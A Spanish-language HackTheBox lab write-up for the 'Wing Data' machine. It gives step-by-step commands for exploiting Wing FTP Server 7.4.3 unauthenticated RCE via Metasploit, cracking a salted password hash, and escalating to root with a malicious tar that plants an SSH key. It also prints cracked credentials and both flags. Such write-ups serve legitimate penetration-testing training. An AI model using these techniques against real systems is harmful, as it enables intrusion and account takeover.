# 🎯 Wing Data — HackTheBox

## Información General

| Campo | Detalle |
|-------|---------|
| **Plataforma** | HackTheBox |
| **Dificultad** | Media |
| **OS** | Linux (Debian) |
| **CVE** | CVE-2025-47812 |
| **Tags** | `rce` `ftp` `vhost` `hash-cracking` `ssh` `privilege-escalation` `tar-exploit` `metasploit` |

---

## Objetivo

Comprometer una máquina Linux explotando una vulnerabilidad de ejecución remota de código sin autenticación en Wing FTP Server 7.4.3, escalar privilegios mediante un script Python vulnerable a Path Traversal en archivos tar, y capturar ambas flags (user y root).

---

## Herramientas Utilizadas

- `nmap` — enumeración de puertos y servicios
- `gobuster` — enumeración de subdominios virtuales (vhost)
- `searchsploit` — búsqueda de exploits locales
- `msfconsole` (Metasploit) — explotación del CVE-2025-47812
- `hash-identifier` — identificación del tipo de hash
- `hashcat` — crackeo de contraseña con salt
- `ssh` — acceso remoto al sistema
- `ssh-keygen` — generación de par de claves SSH
- Script Python personalizado (`cve_2025_4138.py`) — explotación de tar para privesc

---

## Metodología

### 1. Reconocimiento — Conexión VPN y verificación

```bash
sudo openvpn machines_us-4.ovpn
ping 10.129.8.236
```

La máquina responde correctamente. Se confirma conectividad antes de proceder.

---

### 2. Enumeración — Escaneo de puertos y servicios

```bash
nmap -sV -sC 10.129.8.236
```

**Resultado:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.66 (Debian)
| http-title: Did not follow redirect to http://wingdata.htb/
```

Se identifican dos servicios: SSH en el puerto 22 y un servidor web Apache en el puerto 80. El servidor redirige al dominio `wingdata.htb`, lo que indica que se usa **Virtual Hosting**.

---

### 3. Configuración de Virtual Host

El DNS local no resuelve `wingdata.htb`. Se agrega manualmente al archivo de hosts:

```bash
sudo nano /etc/hosts
# Agregar:
10.129.8.236   wingdata.htb
```

El sitio ahora carga correctamente mostrando la página de **Wing Data Solutions**.

---

### 4. Enumeración de Subdominios

Al intentar acceder al "Client Portal" desde el menú, el browser redirige a un subdominio. Se enumera con gobuster en modo vhost:

```bash
gobuster vhost --url http://wingdata.htb \
  --wordlist /home/billy/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain | grep "Status: 200"
```

**Resultado:**
```
ftp.wingdata.htb  Status: 200  [Size: 678]
```

Se agrega el subdominio al archivo de hosts:

```bash
10.129.8.236   ftp.wingdata.htb
```

El portal carga un **Wing FTP Web Client v7.4.3**.

---

### 5. Identificación de Vulnerabilidad

El servicio expuesto es **Wing FTP Server versión 7.4.3**. Una búsqueda en Exploit-DB revela:

```
Wing FTP Server 7.4.3 - Unauthenticated Remote Code Execution (RCE)
EDB-ID: 52347 | CVE: 2025-47812 | Tipo: REMOTE
```

La vulnerabilidad consiste en enviar bytes nulos en el campo de nombre de usuario, lo que permite ejecución de código sin autenticación.

Verificación con searchsploit:

```bash
searchsploit FTP Wing 7.4.3
# Resultado: multiple/remote/52347.py
```

---

### 6. Explotación — RCE con Metasploit

Se carga el módulo correspondiente en msfconsole:

```bash
msf > search wing ftp
msf > use 22   # exploit/multi/http/wingftp_null_byte_rce
```

Configuración del exploit:

```bash
set RHOSTS 10.129.8.236
set LHOST tun0           # IP de la interfaz VPN
set VHOST ftp.wingdata.htb
run
```

**Resultado:**
```
[+] The target is vulnerable. Detected version 7.4.3 <= 7.4.4
[*] Meterpreter session 1 opened
```

Se obtiene una sesión Meterpreter como el usuario `wingftp`.

---

### 7. Post-Explotación — Enumeración del sistema

Se mejora la shell para mayor interactividad:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Enumeración de usuarios en el sistema:**

```bash
cat /etc/passwd
```

Se identifican dos usuarios relevantes: `wingftp` (usuario del servicio FTP) y `wacky` (usuario del sistema).

---

### 8. Obtención de Hash — Credenciales del usuario wacky

Se encuentra el archivo de configuración del usuario `wacky` en Wing FTP:

```bash
cat Data/1/users/wacky.xml
```

Se extrae el hash de la contraseña:

```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
```

---

### 9. Crackeo del Hash — Identificación y ataque

**Paso 1 — Identificar el tipo de hash:**

```bash
hash-identifier
# Input: 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
# Resultado: SHA-256 (posible)
```

**Verificación de longitud:**

```bash
echo -n "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca" | wc -c
# 64 caracteres → consistente con SHA-256
```

**Paso 2 — Intento sin salt (SHA-256 puro, modo 1400):**

```bash
hashcat -m 1400 PasswordsWingData.txt /usr/share/wordlists/rockyou.txt
```

El ataque agota todo rockyou.txt sin éxito → **el hash probablemente tiene salt**.

**Paso 3 — Ataque con salt (SHA-256 + salt, modo 1410):**

La salt se deduce del contexto: el servidor se llama **WingFTP**. Se construye el archivo con el formato `hash:salt`:

```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP
```

```bash
hashcat -m 1410 PasswordsWingData.txt /usr/share/wordlists/rockyou.txt -D 1
```

**Contraseña crackeada:**
```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
```

---

### 10. Acceso SSH — Flag de usuario

Con las credenciales obtenidas:

```bash
ssh wacky@10.129.9.44
# Password: !#7Blushing^*Bride5
```

```bash
wacky@wingdata:~$ cat user.txt
37ef701ffef76967ee5bd62dc900f171
```

---

### 11. Escalada de Privilegios

**Enumeración de permisos sudo:**

```bash
sudo -l
```

```
User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

El script `restore_backup_clients.py` puede ejecutarse como root sin contraseña. Se analiza el código:

- Extrae archivos `.tar` usando `tarfile.extractall()` con `filter="data"`
- Valida el nombre del backup con regex: `^backup_\d+\.tar$`
- Valida el directorio de restauración con regex: `^[a-zA-Z0-9_]{1,24}$`

**Vulnerabilidad identificada:** El filtro `filter="data"` en `tarfile.extractall()` no previene completamente **Path Traversal** vía symlinks en versiones específicas de Python — esto corresponde al **CVE-2025-4138**.

**Explotación:**

Se genera un par de claves SSH:

```bash
ssh-keygen -t ed25519 -f ~/wingdata_key -N ""
```

Se crea un archivo tar malicioso que escribe la clave pública en `/root/.ssh/authorized_keys`:

```bash
touch cve_2025_4138.py
nano cve_2025_4138.py
python3 cve_2025_4138.py --tar-out backup_888.tar --preset ssh-key --payload ~/wingdata_key.pub
```

```
[+] Exploit tar: backup_888.tar
[+] Target:      /root/.ssh/authorized_keys
[+] Payload size: 96 bytes
```

Se mueve el tar al directorio de backups y se ejecuta el script como root:

```bash
mv backup_888.tar /opt/backup_clients/backups/
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \
  -b backup_888.tar -r restore_win123
```

```
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_win123
```

**Acceso como root vía SSH con la clave privada:**

```bash
ssh -i ~/wingdata_key root@127.0.0.1
root@wingdata:~# cat root.txt
59866ba6f18a119c728cef7b4d04ab28
```

---

## Flags

| Tipo | Hash |
|------|------|
| **User Flag** | `37ef701ffef76967ee5bd62dc900f171` |
| **Root Flag** | `59866ba6f18a119c728cef7b4d04ab28` |

---

## Lecciones Aprendidas

1. **Virtual Hosting** puede ocultar servicios adicionales. Siempre enumerar subdominios con herramientas como `gobuster vhost` o `ffuf`.
2. **Wing FTP Server** tenía una vulnerabilidad crítica de RCE sin autenticación (CVE-2025-47812) — los servidores FTP con panel web son superficie de ataque relevante.
3. **Identificar el algoritmo de hash correcto** (incluyendo salt) es crucial para el crackeo. Un hash SHA-256 con salt falló en modo 1400 pero fue crackeado exitosamente en modo 1410 al inferir la salt del contexto.
4. **`sudo -l` siempre**, es la primera comprobación de privesc en Linux. Un script con permisos NOPASSWD que procese archivos de usuario es un vector muy común.
5. **tarfile + CVE-2025-4138**: `filter="data"` no es garantía total de seguridad en la extracción de archivos tar. La validación de rutas en operaciones de extracción debe ser exhaustiva.
6. La escalada mediante escritura de claves SSH en `/root/.ssh/authorized_keys` es una técnica clásica de persistencia y privesc cuando se tiene capacidad de escritura arbitraria.
